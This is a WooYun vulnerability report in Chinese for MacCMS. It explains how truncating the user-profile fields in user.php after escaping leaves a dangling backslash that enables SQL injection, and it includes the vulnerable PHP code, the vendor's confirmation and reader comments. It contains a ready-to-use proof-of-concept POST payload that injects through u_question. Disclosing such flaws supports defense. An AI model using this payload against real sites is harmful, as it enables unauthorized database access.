{"id": 43366, "wybug_id": "wooyun-2014-082973", "wybug_title": "苹果cms 最新版sql注入-2", "wybug_corp": "maccms.com", "wybug_author": "路人甲", "wybug_date": "2014-11-13 15:51", "wybug_open_date": "2015-02-11 15:52", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-16：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-11：\t细节向公众公开  简要描述： 注入 详细说明：  在文件/inc/module/user.php中：\nelseif($method=='save'){\tchklogin();\t$oldpass = be(\"post\",\"u_oldpass\");\t$password1 = be(\"post\",\"u_password1\");\t$password2 = be(\"post\",\"u_password2\");\t$u_qq= be(\"post\",\"u_qq\");\t$u_email = be(\"post\",\"u_email\");\t$u_phone = be(\"post\",\"u_phone\");\t$u_question = be(\"post\",\"u_question\");\t$u_answer = be(\"post\",\"u_email\");\t\t\tif(empty($password1) || empty($u_email)){\t\talert (\"表单信息不完整,请重填!\"); exit;\t}\t\tif (strlen($u_email)>32) { $u_email = substring($u_email,32);}\tif (strlen($u_qq)>16) { $u_qq = substring($u_qq,16);}\tif (strlen($u_phone)>16) { $u_phone = substring($u_phone,16);}\t\t$col = array(\"u_qq\",\"u_email\",\"u_phone\",\"u_question\",\"u_answer\");\t$val = array($u_qq,$u_email,$u_phone,$u_question,$u_answer);\t\tif ($password1 != \"\"){\t\tif ($password1 != $password2){ alert (\"两次密码不同\");exit; }\t\t$password1 = md5($password1);\t\tarray_push($col,\"u_password\");\t\tarray_push($val,$password1);\t}\t$db->Update (\"{pre}user\",$col ,$val ,\"u_id=\".$user[\"u_id\"]);\talertUrl (\"修改成功！\",\"index.php?m=user-info.html\");}\nif (strlen($u_email)>32) { $u_email = substring($u_email,32);}if (strlen($u_qq)>16) { $u_qq = substring($u_qq,16);}if (strlen($u_phone)>16) { $u_phone = substring($u_phone,16);}这里面存在着字符串截断的操作，利用这个截断功能，可以将转义后的内容\\\\ 变成\\这里执行的sql语句：UPDATE mac_user SET u_qq='$u_qq',u_email='$u_email',u_phone='$u_phone',u_question='$u_question',u_answer='$u_answer',u_password='$u_password' WHERE u_id=1其中$u_phone的长度为16.   这样我们设置$u_phone=123456789012345\\     转移再截断前16位，$u_phone的值是一样的。 这时候sql语句就变成UPDATE mac_user SET u_qq='$u_qq',u_email='$u_email',u_phone='123456789012345\\',u_question='$u_question',u_answer='$u_answer',u_password='$u_password' WHERE u_id=1也就是将u_phone的值set成 123456789012345',u_question=。接下来只要将$u_question设置成 ,injectsql#这种格式就可以实现sql注入了。poc：\tURL：\t\tmaccms/index.php?m=user-save.html(需要登录）post参数：\tu_password1=123456&u_password2=123456&u_qq=12345678&u_email=test%40gmail.com&u_phone=123456789012345\\&u_question=,u_question=user()%23&u_answer=123456访问后即可看到 找回密码问题 这一列已经显示了数据库当前账号 \n\n   漏洞证明：  poc：\tURL：\t\tmaccms/index.php?m=user-save.html(需要登录）post参数：\tu_password1=123456&u_password2=123456&u_qq=12345678&u_email=test%40gmail.com&u_phone=123456789012345\\&u_question=,u_question=user()%23&u_answer=123456访问后即可看到 找回密码问题 这一列已经显示了数据库当前账号 \n\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-11-13 16:14 厂商回复： 稍后对漏洞进行修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-04 09:36 |    \t\tBMa \t\t\t( 普通白帽子  |\t\t\t        Rank:1776 漏洞数:200        )\t\t \n  思路真不错    \n     2014-12-04 10:08 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  substring的截断...真是酷    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}